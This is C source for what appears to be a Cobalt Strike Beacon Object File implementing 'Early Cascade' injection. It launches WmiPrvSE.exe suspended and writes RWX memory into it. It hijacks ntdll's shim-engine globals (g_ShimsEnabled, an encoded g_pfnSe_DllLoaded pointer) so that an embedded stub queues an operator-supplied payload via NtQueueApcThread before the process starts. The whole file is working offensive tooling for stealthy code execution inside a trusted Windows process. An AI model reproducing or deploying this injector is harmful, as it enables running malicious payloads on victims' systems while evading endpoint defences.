#include <windows.h>
#include <psapi.h>

#include "beacon.h"
#include "bofdefs.h"

#define SHIMS_ENABLED_OFFSET 0x7194
#define PFNSE_DLLLOADED_OFFSET 0x268
#define TARGET_PROCESS "C:\\Windows\\System32\\Wbem\\WmiPrvSE.exe -Embedding -Secure" 

PVOID get_section_base(HANDLE h_mod, char *section_name);

LPVOID encode_system_ptr(LPVOID ptr) {

	ULONG cookie = *(ULONG*)0x7FFE0330;

	HMODULE m = GetModuleHandle("msvcrt.dll");
	FARPROC _rotr64 = GetProcAddress(m, "_rotr64");

	return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}


PVOID get_section_base(HANDLE h_mod, char *section_name) {

	PIMAGE_NT_HEADERS nt;
	long offset = ((PIMAGE_DOS_HEADER)h_mod)->e_lfanew;
	nt = (PIMAGE_NT_HEADERS)((UINT_PTR)h_mod + offset);

	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

	for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
		if(MSVCRT$memcmp(sec[i].Name, section_name, MSVCRT$strlen(section_name)) == 0) {
			return (PVOID)((UINT_PTR)h_mod + sec[i].VirtualAddress);
		}
	}

	return NULL;
}

void go(char * args, int len) {

	unsigned char cascade_stub_x64[] = {
		0x48, 0x83, 0xec, 0x38,                          // sub rsp, 38h
		0x33, 0xc0,                                      // xor eax, eax
		0x45, 0x33, 0xc9,                                // xor r9d, r9d

		0x48, 0x21, 0x44, 0x24, 0x20,                    // and [rsp+38h+var_18], rax

		/* Set ApcRoutine Address */
		0x48, 0xba,                                      // (offset 16)
		0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // mov rdx, 8888888888888888h

		/* set g_ShimsEnabled to 0 */
		0xa2,                                            // (offset: 25)
		0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // mov ds:9999999999999999h, al

		/* Set ApcArgument1 */
		0x49, 0xb8,                                      // (offset 35)
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov r8, 7777777777777777h

		0x48, 0x8d, 0x48, 0xfe,                          // lea rcx, [rax-2]

		/* Call NtQueueApcThread */
		0x48, 0xb8,                                      // (offset 49)
		0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // mov rax, 6666666666666666h

		0xff, 0xd0,                                      // call rax
		0x33, 0xc0,                                      // xor eax, eax
		0x48, 0x83, 0xc4, 0x38,                          // add rsp, 38h
		0xc3                                             // retn
	};


	datap parser;
	int payload_len;
	unsigned char * payload;

	PROCESS_INFORMATION pi =    { 0 };
	STARTUPINFOA si =           { 0 };

	si.cb = sizeof(si);

	BeaconDataParse(&parser, args, len);
	payload_len = BeaconDataLength(&parser);
	payload = BeaconDataExtract(&parser, NULL);

	HMODULE nt = GetModuleHandle("ntdll");
	BeaconPrintf(CALLBACK_OUTPUT, "ntdll->%p\n", nt);

	PVOID p_mrdata =    get_section_base(nt, ".mrdata");
	PVOID p_data =      get_section_base(nt, ".data");

	PVOID g_ShimsEnabled =      (PVOID)((UINT_PTR)p_data + SHIMS_ENABLED_OFFSET);
	PVOID g_pfnSe_DllLoaded =   (PVOID)((UINT_PTR)p_mrdata + PFNSE_DLLLOADED_OFFSET);

	BeaconPrintf(CALLBACK_OUTPUT, "p_mrdata->%p\n", p_mrdata);
	BeaconPrintf(CALLBACK_OUTPUT, "p_data->%p\n", p_data);
	BeaconPrintf(CALLBACK_OUTPUT, "g_ShimsEnabled->%p\n", g_ShimsEnabled);
	BeaconPrintf(CALLBACK_OUTPUT, "g_pfnSe_DllLoaded->%p\n", g_pfnSe_DllLoaded);

	if (!KERNEL32$CreateProcessA(NULL, TARGET_PROCESS, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		BeaconPrintf(CALLBACK_ERROR, "[-] CreateProcessA failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "pid->%d\n", pi.dwProcessId);

	LPVOID addr = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, sizeof(cascade_stub_x64) + payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (addr == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "[-] VirtualAllocExec failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	/* write g_ShimsEnabled address to stub */
	MSVCRT$memcpy(&cascade_stub_x64[25], &g_ShimsEnabled, sizeof(PVOID));

	/* write our final payload address to stub for second argument of NtQueueApcThread */
	UINT_PTR ptr = ((UINT_PTR)(addr) + sizeof(cascade_stub_x64));
	MSVCRT$memcpy(&cascade_stub_x64[16], &ptr, sizeof(PVOID));

	/* write address of NtQueueApcThread to stub */
	LPVOID x = KERNEL32$GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
	MSVCRT$memcpy(&cascade_stub_x64[49], &x, sizeof(PVOID));

	UINT_PTR n = 1;
	KERNEL32$WriteProcessMemory(pi.hProcess, g_ShimsEnabled, &n, sizeof(BYTE), NULL);

	LPVOID encoded = encode_system_ptr(addr);

	if(!KERNEL32$WriteProcessMemory(pi.hProcess, g_pfnSe_DllLoaded, &encoded, sizeof(PVOID), NULL)) {
		BeaconPrintf(CALLBACK_ERROR, "[-] WriteProcessMemory failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	if(!KERNEL32$WriteProcessMemory(pi.hProcess, addr, cascade_stub_x64, sizeof(cascade_stub_x64), NULL)) {
		BeaconPrintf(CALLBACK_ERROR, "[-] WriteProcessMemory failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	if(!KERNEL32$WriteProcessMemory(pi.hProcess, (LPVOID)((UINT_PTR)addr + sizeof(cascade_stub_x64)), payload, payload_len, NULL)) {
		BeaconPrintf(CALLBACK_ERROR, "[-] WriteProcessMemory failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	KERNEL32$ResumeThread(pi.hThread);

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Done\n");

}